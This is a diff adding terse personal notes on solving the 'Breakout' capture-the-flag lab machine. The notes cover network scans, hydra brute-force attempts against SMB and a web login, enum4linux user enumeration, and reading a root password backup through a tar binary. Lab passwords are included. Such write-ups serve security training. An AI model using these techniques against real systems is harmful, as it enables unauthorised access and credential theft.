@@ -1,0 +1,34 @@
+Breakout CTF
+-----------------
+*** scan the network for the new vulnerable machine ***
+
+--> netdiscover -r 10.0.2.0/24 [target ip is 10.0.2.10]
+
+*** perform an nmpa scam on the target ***
+
+--> nmap -p- -sV -sC -oN brk.txt 10.0.2.10
+
+*** looks like there is an HTTP page ***
+
+--> 10.0.2.10:80 [on browser]
+
+*** there was an encrypted line on the page's source. encoded using brainfuck algorithm. and now we have a password .2uqPEfj3D<P'a-3 ***
+*** NOw we need to find username that goes with the password ***
+
+hydra -L usernames.txt -P passwords.txt -f smb://10.0.2.10 -V --> didnt work
+
+hydra -L usernames.txt -p guest -s 20000 10.0.2.10 http-post-form "/:username=^USER^&password^PASS^&Login=Login:Invalid username." --> didnt worl
+
+nmap -sV -p 22 -A 10.0.2.10
+
+enum4linux -a 10.0.2.10 --> worked
+
+*** Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ****
+*** local user unix/cyber ***
+
+./tar -cf backup.tar /var/backups/.old_pass.bak
+./tar -xf backup.tar
+
+Ts&4&YurgtRX(=~h [root password]
+
+***** /var has a directory called backups [built in] it stores backups of all important information *****
